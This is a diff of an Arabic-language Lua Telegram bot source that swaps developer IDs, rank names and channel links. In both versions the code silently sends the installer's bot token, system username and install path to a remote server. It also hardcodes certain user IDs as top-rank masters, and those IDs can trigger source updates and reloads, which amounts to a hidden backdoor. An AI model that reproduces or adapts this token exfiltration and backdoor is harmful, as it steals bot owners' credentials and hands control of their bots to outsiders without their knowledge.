@@ -54,7 +54,7 @@ local DirFol = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ','
 user = {}
 user.username = SUDO_USER
 user.Source  = DirFol
-local url , res = https.request('https://broadcast.aym9n.xyz/Source/index.php?Array='..JSON.encode(user))
+local url , res = https.request('https://broadcast..xyz/Source/index.php?Array='..JSON.encode(user))
 print(res)
 if res ~= 200 then
 print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
@@ -93,7 +93,7 @@ info = {}
 info.username = '@'..GetUser.information.username
 info.userbot  = BOT_User
 info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://broadcast.aym9n.xyz/Source/In.php?insert='..JSON.encode(info))
+https.request('https://broadcast..xyz/Source/In.php?insert='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
@@ -280,23 +280,23 @@ end
 return false 
 end 
 
-if msg.sender_user_id_ == 1088394097 or msg.sender_user_id_ == 1088394097  then 
-msg.TheRankCmd = 'الهكر ايمن'
-msg.TheRank = 'الهكر ايمن'
+if msg.sender_user_id_ == 1099083018 or msg.sender_user_id_ == 1099083018  then 
+msg.TheRankCmd = 'Mastr'
+msg.TheRank = 'Mastr'
 msg.Rank = 1
-elseif msg.sender_user_id_ == 1480243587 then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Mamy' 
-msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Mamy' 
+elseif msg.sender_user_id_ == 1099083018 then 
+msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Mastr' 
+msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Mastr' 
 msg.Rank = 1
-elseif msg.sender_user_id_ == 843591577 then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'زلمتي' 
-msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'زلمتي' 
+elseif msg.sender_user_id_ == 1099083018 then 
+msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Mastr' 
+msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Mastr' 
 msg.Rank = 1
-elseif msg.sender_user_id_ == 1142798706 then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Daddy' 
-msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Daddy' 
+elseif msg.sender_user_id_ == 1099083018 then 
+msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Mastr' 
+msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Mastr' 
 msg.Rank = 1
-elseif msg.sender_user_id_ == 39809485 then 
+elseif msg.sender_user_id_ == 1099083018 then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
 msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'Master' 
 msg.Rank = 1
@@ -388,7 +388,7 @@ text = [[*اهلين انا ]]..redis:get(boss..':NameBot:')..[[ 🧚*
 
 
 ]]
-local inline = {{{text="ضيفني لـ مجموعتك 🧚",url="https://telegram.me/KQEBot?startgroup=start"}},{{text="تحديثات شرس 🦦",url="https://t.me/FAWAZ879"}}}
+local inline = {{{text="ضيفني لـ مجموعتك 🧚",url="https://telegram.me/TI6BOT?startgroup=start"}},{{text="تحديثات سورس 🧚🏻‍♀️",url="https://t.me/eel00"}}}
 send_keyPhoto(msg.chat_id_,text,nil,inline,msg.id_)
 return false
 end
@@ -896,7 +896,7 @@ end
 
 if abbas == '/HelpList'..UserID then
 SUDO_USER = redis:hgetall(boss..'username:'..SUDO_ID).username
-Text = [[*• اهلا بك في اوامر البوت
+Text = [[*- هلا فيك في اوامر البوت 
 
 للاستفسار -* []]..SUDO_USER..[[]
 
@@ -943,19 +943,19 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="ت" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1088394097 or msg.sender_user_id_ == 39809485) then
+if (msg.text=="تحديث" or msg.text=="ت" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1099083018 or msg.sender_user_id_ == 39809485) then
 return sendMsg(msg.chat_id_,msg.id_,"*تم*",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1088394097 or msg.sender_user_id_ == 39809485) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1099083018 or msg.sender_user_id_ == 1099083018) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "ر") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1088394097 or msg.sender_user_id_ == 39809485) then
+if (msg.text == 'reload' or msg.text == "ر") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1099083018 or msg.sender_user_id_ == 1099083018) then
 sendMsg(msg.chat_id_,msg.id_,'*تم*',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
